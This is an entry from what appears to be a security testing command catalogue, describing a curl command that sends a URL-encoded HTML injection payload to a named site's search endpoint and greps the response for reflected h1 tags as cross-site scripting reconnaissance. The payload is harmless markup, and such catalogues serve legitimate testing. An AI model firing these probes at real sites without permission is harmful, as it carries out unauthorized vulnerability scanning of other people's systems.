---
id: cmd-001
data: >-
  curl -s
  "https://panther.com/search/Users%3Ch1%3EHello,%20I%20am%3C/h1%3E%3Cfont%20color=red%3E%20Ibrahimatix0x01%3C/font%3E"
  | grep -i "h1"
tags:
  - xss
  - recon
type: command
output: 'Expected: Lines containing <h1>Hello, I am</h1> if reflected.'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:50.041Z'
verified: false
validated: true
submitted: true
---
# curl-html-injection-test

## Command

```bash
curl -s "https://panther.com/search/Users%3Ch1%3EHello,%20I%20am%3C/h1%3E%3Cfont%20color=red%3E%20Ibrahimatix0x01%3C/font%3E" | grep -i "h1"
```

## Description

This command uses curl to fetch the target search page with an encoded HTML injection payload and greps for the <h1> tag to check if it's reflected unsanitized. Use it during initial XSS reconnaissance on web search endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode to suppress progress meter | Yes |
| URL | Target URL with encoded payload | Yes |
| `grep -i "h1"` | Case-insensitive search for HTML tag | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://panther.com/search/Users%3Ch1%3EHello,%20I%20am%3C/h1%3E%3Cfont%20color=red%3E%20Ibrahimatix0x01%3C/font%3E" | grep -i "h1"
```

### Advanced Usage

```bash
curl -s -v "https://panther.com/search/<payload>" | grep -E "(h1|font)"
```

## Expected Output

If vulnerable, output includes lines like "<h1>Hello, I am</h1>", indicating reflection. No output suggests sanitization or blocking.

## Related

- [[Related Procedure: Test-Reflected-XSS-with-HTML-Injection]]
